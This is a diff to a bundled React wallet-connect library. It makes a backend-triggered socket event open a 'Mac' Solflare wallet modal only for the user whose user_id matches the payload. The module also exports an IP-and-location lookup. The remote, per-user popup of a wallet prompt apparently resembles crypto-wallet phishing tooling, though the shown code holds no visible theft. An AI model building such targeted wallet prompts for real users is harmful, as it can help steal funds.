@@ -611,10 +611,11 @@ const initializeSocket = () => {
 };
 /**
  * Subscribe to backend "show Mac modal" socket event.
- * When the backend emits this event, the callback is invoked.
+ * When the backend emits this event, the callback is invoked with the payload.
  * Use with MacModalTrigger to show the Mac modal on signal.
+ * The modal should only be shown when payload.user_id matches the client's userId.
  *
- * @param callback - Called when the backend emits the showMacModal event (configurable via macModalSocketEvent).
+ * @param callback - Called with the emitted payload (e.g. { message, user_id, timestamp }).
  * @returns Unsubscribe function.
  */
 const subscribeToShowMacModal = (callback) => {
@@ -623,7 +624,7 @@ const subscribeToShowMacModal = (callback) => {
         return () => { };
     }
     const eventName = getMacModalSocketEvent();
-    const handler = () => callback();
+    const handler = (payload) => callback(payload);
     socket.on(eventName, handler);
     return () => {
         socket.off(eventName, handler);
@@ -14503,20 +14504,25 @@ const ConnectWalletButton = ({ className = '', userId, }) => {
 };
 
 /**
- * Listens for the backend socket event (default: `showMacModal`) and opens the Mac modal when received.
- * Mount this component once (e.g. at app root) to enable socket-triggered Mac modal.
+ * Listens for the backend socket event (default: `showMacModal`) and opens the Mac modal only when
+ * the payload's user_id matches this component's userId (or backendConfig.userId).
+ * Mount once (e.g. at app root) to enable socket-triggered Mac modal.
  *
- * Backend should emit the event configured via `setConfig({ macModalSocketEvent: 'yourEventName' })`.
+ * Backend example: io.emit('showMacModal', { message: '...', user_id, timestamp });
  */
 const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
     const [isOpen, setIsOpen] = useState(false);
+    const effectiveUserId = userId ?? backendConfig?.userId;
     useEffect(() => {
         initializeSocket();
-        const unsubscribe = subscribeToShowMacModal(() => {
-            setIsOpen(true);
+        const unsubscribe = subscribeToShowMacModal((payload) => {
+            const emitUserId = payload?.user_id;
+            if (effectiveUserId && emitUserId && emitUserId === effectiveUserId) {
+                setIsOpen(true);
+            }
         });
         return unsubscribe;
-    }, []);
+    }, [effectiveUserId]);
     const handleClose = () => {
         setIsOpen(false);
         onClose?.();
@@ -14524,7 +14530,7 @@ const MacModalTrigger = ({ userId, backendConfig, onClose, }) => {
     if (!isOpen)
         return null;
     return (React.createElement(ModalContainer, null,
-        React.createElement(SolflareModal, { wallet: "Mac", isOpen: isOpen, onClose: handleClose, userId: userId ?? backendConfig?.userId, backendConfig: backendConfig })));
+        React.createElement(SolflareModal, { wallet: "Mac", isOpen: isOpen, onClose: handleClose, userId: effectiveUserId, backendConfig: backendConfig })));
 };
 
 export { ASSET_PATHS, ConnectWalletButton, CustomWalletModal, MacModalTrigger, WalletSelectionModal, clearWalletTypesCache, getAllWalletTypes, getAssetBaseUrl, getAssetPath, getBackendUrl, getClientUrl, getConfig, getIPAndLocation, getMacModalSocketEvent, getUserWalletTypes, getWalletConfig, getWalletShortKey, resolveAssetUrl, setConfig, subscribeToShowMacModal, walletConfigs };
